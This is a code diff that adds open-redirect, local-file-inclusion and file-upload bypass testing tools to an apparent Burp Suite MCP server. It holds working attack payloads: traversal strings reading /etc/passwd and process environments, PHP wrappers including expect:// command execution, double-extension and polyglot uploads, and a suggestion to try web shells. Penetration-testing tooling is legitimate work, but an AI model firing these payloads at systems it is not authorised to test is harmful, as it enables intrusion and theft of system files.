@@ -1,11 +1,26 @@
 """Edge-case security testing tools — JWT, CORS, GraphQL, LLM injection, WebSocket, cloud metadata."""
 
+import asyncio
 import base64
 import json
+import uuid
 
 from mcp.server.fastmcp import FastMCP
 
 from burpsuite_mcp import client
+
+
+def _build_multipart(field_name: str, filename: str, content: str, content_type: str) -> tuple[str, str]:
+    """Build a multipart/form-data body. Returns (body, boundary)."""
+    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
+    body = (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
+        f"Content-Type: {content_type}\r\n\r\n"
+        f"{content}\r\n"
+        f"--{boundary}--\r\n"
+    )
+    return body, boundary
 
 
 def register(mcp: FastMCP):
@@ -383,5 +398,402 @@ def register(mcp: FastMCP):
                     lines.append(f"  HIGH: Debug interface exposed ({p})")
         else:
             lines.append(f"\nNo sensitive files found.")
+
+        return "\n".join(lines)
+
+    # ── New edge-case tools ──────────────────────────────────────────
+
+    @mcp.tool()
+    async def test_open_redirect(
+        session: str,
+        path: str,
+        parameter: str,
+        poll_seconds: int = 5,
+        follow_redirects: bool = False,
+    ) -> str:
+        """Test for open redirect using Burp Collaborator for real confirmation.
+        Generates a Collaborator URL, builds redirect bypass payloads from it,
+        injects each payload, then polls for DNS/HTTP interactions to confirm
+        the redirect actually reached the external server.
+
+        Requires Burp Suite Professional with Collaborator configured.
+
+        Args:
+            session: Session name
+            path: Endpoint path (e.g. '/login')
+            parameter: Redirect parameter name (e.g. 'redirect', 'url', 'next', 'return')
+            poll_seconds: Seconds to wait before polling for interactions (default 5, max 15)
+            follow_redirects: If True, follow redirects (useful to test client-side redirects)
+        """
+        # Step 1: Generate Collaborator payload
+        collab = await client.post("/api/collaborator/payload")
+        if "error" in collab:
+            return f"Error generating Collaborator payload: {collab['error']}\nRequires Burp Suite Professional."
+
+        collab_url = collab.get("payload", "")
+        collab_host = collab_url.replace("http://", "").replace("https://", "").split("/")[0]
+        if not collab_host:
+            return "Error: Could not extract Collaborator host from payload."
+
+        # Step 2: Build redirect payloads using the real Collaborator URL
+        payloads = [
+            (f"https://{collab_host}", "Absolute URL"),
+            (f"//{collab_host}", "Protocol-relative"),
+            (f"\\/\\/{collab_host}", "Escaped slashes"),
+            (f"////{collab_host}", "Quadruple slash"),
+            (f"https:{collab_host}", "Missing slashes"),
+            (f"//{collab_host}%2F%2F", "URL-encoded trailing slashes"),
+            (f"//{collab_host}?target.com", "Collaborator as host, target as query"),
+            (f"https://target.com@{collab_host}", "At-sign authority confusion"),
+            (f"https://{collab_host}%00.target.com", "Null byte domain truncation"),
+            (f"https://{collab_host}/.target.com", "Dot after Collaborator host"),
+        ]
+
+        sep = "&" if "?" in path else "?"
+        lines = [f"Open Redirect Test (Collaborator-verified): {parameter} on {path}"]
+        lines.append(f"Collaborator: {collab_host}\n")
+        lines.append(f"{'#':<4} {'PAYLOAD':<50} {'STATUS':<8} {'LOCATION'}")
+        lines.append("-" * 100)
+
+        # Step 3: Send all payloads
+        redirect_candidates = []
+        for i, (payload, desc) in enumerate(payloads, 1):
+            inject_path = f"{path}{sep}{parameter}={payload}"
+            resp = await client.post("/api/session/request", json={
+                "session": session, "method": "GET", "path": inject_path,
+                "follow_redirects": follow_redirects,
+            })
+            if "error" in resp:
+                lines.append(f"{i:<4} {desc:<50} {'ERR':<8} —")
+                continue
+
+            status = resp.get("status", 0)
+            location = ""
+            for h in resp.get("response_headers", []):
+                if h["name"].lower() == "location":
+                    location = h["value"]
+                    break
+
+            # Track candidates: any 3xx or location header containing collaborator
+            is_redirect = status in (301, 302, 303, 307, 308)
+            has_collab_in_loc = collab_host in location if location else False
+
+            loc_display = location[:45] + ".." if len(location) > 45 else location
+            if has_collab_in_loc:
+                redirect_candidates.append(desc)
+                lines.append(f"{i:<4} {desc:<50} {status:<8} {loc_display} [REDIRECT TO COLLAB]")
+            elif is_redirect:
+                lines.append(f"{i:<4} {desc:<50} {status:<8} {loc_display}")
+            else:
+                lines.append(f"{i:<4} {desc:<50} {status:<8} {'(no redirect)'}")
+
+        # Step 4: Poll Collaborator for REAL interactions
+        lines.append("")
+        poll_seconds = min(max(poll_seconds, 1), 15)
+        lines.append(f"Polling Collaborator for {poll_seconds}s...")
+
+        await asyncio.sleep(poll_seconds)
+
+        interactions_data = await client.get("/api/collaborator/interactions")
+        interactions = interactions_data.get("interactions", []) if "error" not in interactions_data else []
+
+        # Count DNS/HTTP interactions as confirmation
+        dns_hits = [i for i in interactions if i.get("type") == "DNS"]
+        http_hits = [i for i in interactions if i.get("type") == "HTTP"]
+
+        lines.append("")
+        if dns_hits or http_hits:
+            total_hits = len(dns_hits) + len(http_hits)
+            lines.append(f"*** CONFIRMED: {total_hits} Collaborator interaction(s) detected ***")
+            if dns_hits:
+                lines.append(f"  DNS lookups: {len(dns_hits)}")
+                for hit in dns_hits[:5]:
+                    lines.append(f"    from {hit.get('client_ip', '?')} at {hit.get('timestamp', '?')}")
+            if http_hits:
+                lines.append(f"  HTTP callbacks: {len(http_hits)}")
+                for hit in http_hits[:5]:
+                    lines.append(f"    from {hit.get('client_ip', '?')} at {hit.get('timestamp', '?')}")
+
+            lines.append("")
+            lines.append("The target server followed the redirect to the Collaborator URL.")
+            lines.append("This is a CONFIRMED open redirect vulnerability.")
+            if redirect_candidates:
+                lines.append(f"\nWorking bypass techniques: {', '.join(redirect_candidates)}")
+        else:
+            lines.append("No Collaborator interactions detected.")
+            if redirect_candidates:
+                lines.append(f"\nNote: {len(redirect_candidates)} payload(s) showed redirect in Location header")
+                lines.append(f"  ({', '.join(redirect_candidates)})")
+                lines.append("  These may still be exploitable client-side (browser follows redirect).")
+                lines.append("  The Collaborator test only confirms server-side following.")
+            else:
+                lines.append("No open redirect detected (no redirects to Collaborator, no interactions).")
+
+        return "\n".join(lines)
+
+    @mcp.tool()
+    async def test_lfi(
+        session: str,
+        path: str,
+        parameter: str,
+        os_type: str = "auto",
+        test_wrappers: bool = True,
+        depth: int = 6,
+    ) -> str:
+        """Test for Local File Inclusion / path traversal vulnerabilities.
+        Auto-generates traversal payloads with encoding bypasses, null bytes, and PHP wrappers.
+
+        Args:
+            session: Session name
+            path: Endpoint path (e.g. '/page')
+            parameter: File parameter name (e.g. 'file', 'page', 'template', 'include')
+            os_type: Target OS - 'linux', 'windows', or 'auto' (tests both)
+            test_wrappers: Test PHP stream wrappers (php://filter, data://, etc.)
+            depth: Traversal depth (default 6)
+        """
+        depth = min(depth, 20)
+        payloads = []
+        traversal = "../" * depth
+
+        # Linux payloads
+        if os_type in ("auto", "linux"):
+            payloads.extend([
+                (f"{traversal}etc/passwd", "linux", "Basic traversal"),
+                (f"{'..%2f' * depth}etc%2fpasswd", "linux", "URL-encoded slash"),
+                (f"{'..%252f' * depth}etc%252fpasswd", "linux", "Double URL-encoded"),
+                (f"{'....//..../' * (depth // 2)}etc/passwd", "linux", "Double-dot filter bypass"),
+                (f"{'..%c0%af' * depth}etc/passwd", "linux", "UTF-8 overlong encoding"),
+                ("/etc/passwd", "linux", "Absolute path"),
+                (f"{traversal}proc/self/environ", "linux", "Process environment"),
+            ])
+
+        # Windows payloads
+        if os_type in ("auto", "windows"):
+            win_traversal = "..\\" * depth
+            payloads.extend([
+                (f"{win_traversal}windows\\win.ini", "windows", "Backslash traversal"),
+                (f"{traversal}windows/win.ini", "windows", "Forward slash traversal"),
+                (f"{'..%5c' * depth}windows%5cwin.ini", "windows", "URL-encoded backslash"),
+                (f"{'..%255c' * depth}windows%255cwin.ini", "windows", "Double URL-encoded backslash"),
+                (f"{win_traversal}inetpub\\wwwroot\\web.config", "windows", "IIS web.config"),
+            ])
+
+        # PHP wrappers
+        if test_wrappers:
+            payloads.extend([
+                ("php://filter/convert.base64-encode/resource=index", "wrapper", "php://filter base64"),
+                ("php://filter/convert.base64-encode/resource=../config", "wrapper", "php://filter config"),
+                ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "wrapper", "data:// phpinfo"),
+                ("expect://id", "wrapper", "expect:// command exec"),
+                (f"{traversal}etc/passwd%00.png", "null_byte", "Null byte truncation"),
+            ])
+
+        # Baseline
+        sep = "&" if "?" in path else "?"
+        baseline_resp = await client.post("/api/session/request", json={
+            "session": session, "method": "GET", "path": path,
+        })
+        baseline_length = baseline_resp.get("response_length", 0) if "error" not in baseline_resp else 0
+
+        # Linux/Windows indicators
+        linux_indicators = ["root:x:", "root:*:", "/bin/bash", "/bin/sh", "daemon:"]
+        windows_indicators = ["[fonts]", "[extensions]", "for 16-bit app", "[mail]"]
+        wrapper_indicators = ["PD9waH", "PCFET0", "eyJ"]  # base64 prefixes for PHP, HTML, JSON
+
+        lines = [f"LFI/Path Traversal Test: {parameter} on {path}\n"]
+        lines.append(f"OS: {os_type} | Depth: {depth} | Wrappers: {test_wrappers}")
+        lines.append(f"Baseline length: {baseline_length}B\n")
+        lines.append(f"{'PAYLOAD':<55} {'STATUS':<8} {'LEN':<8} {'RESULT'}")
+        lines.append("-" * 110)
+        vulns = []
+
+        for payload, ptype, desc in payloads:
+            inject_path = f"{path}{sep}{parameter}={payload}"
+            resp = await client.post("/api/session/request", json={
+                "session": session, "method": "GET", "path": inject_path,
+            })
+            if "error" in resp:
+                lines.append(f"{desc:<55} {'ERR':<8} {'?':<8} Error")
+                continue
+
+            status = resp.get("status", 0)
+            length = resp.get("response_length", 0)
+            body = resp.get("response_body", "")
+
+            # Check indicators
+            vulnerable = False
+            result = "No match"
+
+            if ptype == "linux":
+                matched = [i for i in linux_indicators if i in body]
+                if matched:
+                    vulnerable = True
+                    result = f"VULNERABLE ({', '.join(matched)})"
+            elif ptype == "windows":
+                matched = [i for i in windows_indicators if i.lower() in body.lower()]
+                if matched:
+                    vulnerable = True
+                    result = f"VULNERABLE ({', '.join(matched)})"
+            elif ptype == "wrapper":
+                # Check for base64 content or phpinfo
+                if any(ind in body for ind in wrapper_indicators):
+                    vulnerable = True
+                    result = "VULNERABLE (wrapper content)"
+                elif "phpinfo" in body.lower() or "<title>phpinfo()" in body:
+                    vulnerable = True
+                    result = "VULNERABLE (phpinfo)"
+            elif ptype == "null_byte":
+                matched = [i for i in linux_indicators if i in body]
+                if matched:
+                    vulnerable = True
+                    result = f"VULNERABLE (null byte bypass)"
+
+            # Length anomaly
+            if not vulnerable and status == 200 and baseline_length > 0:
+                diff_pct = abs(length - baseline_length) / baseline_length * 100 if baseline_length else 0
+                if diff_pct > 50 and length > baseline_length:
+                    result = f"ANOMALY (+{diff_pct:.0f}% length)"
+
+            if vulnerable:
+                vulns.append(desc)
+
+            payload_display = desc[:53] + ".." if len(desc) > 53 else desc
+            marker = " ***" if vulnerable else ""
+            lines.append(f"{payload_display:<55} {status:<8} {length:<8} {result}{marker}")
+
+        lines.append("")
+        if vulns:
+            lines.append(f"*** {len(vulns)} LFI/path traversal vulnerabilities found ***")
+            for v in vulns:
+                lines.append(f"  -> {v}")
+        else:
+            lines.append("No LFI/path traversal detected.")
+
+        return "\n".join(lines)
+
+    @mcp.tool()
+    async def test_file_upload(
+        session: str,
+        path: str,
+        parameter: str = "file",
+        test_types: list[str] | None = None,
+        content_type_bypass: bool = True,
+    ) -> str:
+        """Test file upload endpoint for bypass vulnerabilities.
+        Generates test files with various evasion techniques: double extension,
+        content-type mismatch, magic bytes, polyglot files, SVG XSS.
+
+        Args:
+            session: Session name
+            path: Upload endpoint path (e.g. '/upload', '/api/files')
+            parameter: Form field name for file upload (default 'file')
+            test_types: File types to test - ['php', 'jsp', 'aspx', 'svg_xss', 'html', 'polyglot']
+            content_type_bypass: Also test with mismatched Content-Type headers
+        """
+        types = test_types or ["php", "html", "svg_xss", "polyglot"]
+
+        # Define test cases: (filename, content, content_type, description)
+        test_cases = []
+
+        if "php" in types:
+            test_cases.extend([
+                ("test.php", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHP direct upload"),
+                ("test.php.jpg", "<?php echo 'UPLOAD_TEST_OK'; ?>", "image/jpeg", "PHP double extension"),
+                ("test.phtml", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHTML extension"),
+                ("test.php5", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "PHP5 extension"),
+                ("test.pHp", "<?php echo 'UPLOAD_TEST_OK'; ?>", "application/x-php", "Mixed case PHP"),
+            ])
+            if content_type_bypass:
+                test_cases.append(
+                    ("test.php", "<?php echo 'UPLOAD_TEST_OK'; ?>", "image/jpeg", "PHP with image/jpeg CT"),
+                )
+
+        if "jsp" in types:
+            test_cases.extend([
+                ("test.jsp", '<%= "UPLOAD_TEST_OK" %>', "application/x-jsp", "JSP direct upload"),
+                ("test.jsp.png", '<%= "UPLOAD_TEST_OK" %>', "image/png", "JSP double extension"),
+                ("test.jspx", '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0"><jsp:text>UPLOAD_TEST_OK</jsp:text></jsp:root>', "application/xml", "JSPX extension"),
+            ])
+
+        if "aspx" in types:
+            test_cases.extend([
+                ("test.aspx", '<%@ Page Language="C#" %><%= "UPLOAD_TEST_OK" %>', "application/x-aspx", "ASPX direct upload"),
+                ("test.aspx;.jpg", '<%@ Page Language="C#" %><%= "UPLOAD_TEST_OK" %>', "image/jpeg", "ASPX semicolon bypass"),
+            ])
+
+        if "svg_xss" in types:
+            test_cases.extend([
+                ("test.svg", '<svg onload=alert("UPLOAD_TEST_OK")>', "image/svg+xml", "SVG onload XSS"),
+                ("test.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("UPLOAD_TEST_OK")</script></svg>', "image/svg+xml", "SVG script XSS"),
+            ])
+
+        if "html" in types:
+            test_cases.append(
+                ("test.html", "<html><body><script>alert('UPLOAD_TEST_OK')</script></body></html>", "text/html", "HTML with JavaScript"),
+            )
+
+        if "polyglot" in types:
+            test_cases.append(
+                ("test.gif.php", "GIF89a; <?php echo 'UPLOAD_TEST_OK'; ?>", "image/gif", "GIF+PHP polyglot"),
+            )
+
+        lines = [f"File Upload Test: {path} (field: {parameter})\n"]
+        lines.append(f"{'FILENAME':<25} {'CONTENT-TYPE':<22} {'STATUS':<8} {'RESULT':<20} {'DESCRIPTION'}")
+        lines.append("-" * 110)
+        vulns = []
+
+        for filename, content, ct, desc in test_cases:
+            body, boundary = _build_multipart(parameter, filename, content, ct)
+            resp = await client.post("/api/session/request", json={
+                "session": session,
+                "method": "POST",
+                "path": path,
+                "headers": {"Content-Type": f"multipart/form-data; boundary={boundary}"},
+                "body": body,
+            })
+
+            if "error" in resp:
+                lines.append(f"{filename:<25} {ct:<22} {'ERR':<8} {'Error':<20} {desc}")
+                continue
+
+            status = resp.get("status", 0)
+            resp_body = resp.get("response_body", "").lower()
+
+            # Determine if upload succeeded
+            uploaded = False
+            result = "Rejected"
+            if status in (200, 201):
+                success_indicators = ["uploaded", "success", "stored", "saved"]
+                reject_indicators = ["error", "invalid", "not allowed", "rejected", "forbidden", "unsupported", "denied"]
+
+                success_count = sum(1 for ind in success_indicators if ind in resp_body)
+                has_reject = any(ind in resp_body for ind in reject_indicators)
+                has_success = success_count >= 1
+
+                if has_success and not has_reject:
+                    uploaded = True
+                    result = "UPLOADED"
+                    vulns.append(f"{filename} ({desc})")
+                elif not has_reject:
+                    result = "Possible (200)"
+            elif status == 403:
+                result = "Forbidden"
+            elif status == 415:
+                result = "Type rejected"
+
+            marker = " ***" if uploaded else ""
+            lines.append(f"{filename:<25} {ct:<22} {status:<8} {result:<20} {desc}{marker}")
+
+        lines.append("")
+        if vulns:
+            lines.append(f"*** {len(vulns)} potentially dangerous uploads accepted ***")
+            for v in vulns:
+                lines.append(f"  -> {v}")
+            lines.append("\nNext steps:")
+            lines.append("  1. Check if uploaded files are accessible (look for URL/path in response)")
+            lines.append("  2. Try accessing uploaded file to confirm execution")
+            lines.append("  3. Test with web shell payloads if execution confirmed")
+        else:
+            lines.append("No dangerous file uploads accepted.")
 
         return "\n".join(lines)
